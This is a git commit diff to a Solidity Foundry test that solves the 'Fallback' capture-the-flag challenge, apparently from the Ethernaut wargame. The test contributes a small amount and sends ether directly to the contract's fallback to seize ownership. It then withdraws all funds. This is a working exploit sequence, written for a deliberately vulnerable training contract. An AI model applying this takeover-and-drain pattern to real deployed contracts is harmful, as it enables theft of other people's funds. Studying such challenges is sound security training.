205f7070de9a4551d32209613e2519d42f0a5830
karooolis <hello@karolisram.com>
2023-04-07 18:56:44 +0300

    add 2-Fallout challenge

--- test/1-Fallback.t.sol
+++ test/1-Fallback.t.sol
@@ -5,19 +5,13 @@ import "forge-std/Test.sol";
 import "../src/1-Fallback.sol";
 
 contract FallbackTest is Test {
-    // Fallback public fallback;
     Fallback public fallbackCTF;
 
-    address attacker = address(0xE659256acc9cF3927CEb1aBeeb03Aabe045e9d74);
-
     function setUp() public {
-        vm.deal(attacker, 1000 ether);
         fallbackCTF = new Fallback();
     }
 
     function testAttack() public {
-        vm.startPrank(attacker);
-
         // contribute small amount
         fallbackCTF.contribute{value: 0.0001 ether}();
 
@@ -25,9 +19,11 @@ contract FallbackTest is Test {
         address(fallbackCTF).call{value: 1 ether}("");
 
         // check if attacker is owner
-        assertEq(fallbackCTF.owner(), attacker);
+        assertEq(fallbackCTF.owner(), address(this));
 
         // withdraw all funds
         fallbackCTF.withdraw();
     }
+
+    receive() external payable {}
 }
